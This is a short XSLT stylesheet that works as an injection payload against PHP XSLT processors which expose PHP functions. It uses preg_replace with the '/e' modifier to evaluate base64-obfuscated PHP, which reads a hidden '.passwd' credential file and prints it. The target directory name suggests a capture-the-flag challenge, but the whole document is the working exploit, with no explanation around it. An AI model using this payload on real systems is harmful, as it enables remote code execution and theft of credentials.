<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
          <xsl:template match="/">
                  <xsl:variable name="eval">
                          eval(base64_decode('JGhvbWVwYWdlID0gZmlsZV9nZXRfY29udGVudHMoJy42ZmYzMjAwYmVlNzg1ODAxZjQyMGZiYTgyNmZmY2RlZS8ucGFzc3dkJyk7CmVjaG8gJGhvbWVwYWdlOw=='))
                  </xsl:variable>
                  <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
          </xsl:template>
</xsl:stylesheet>

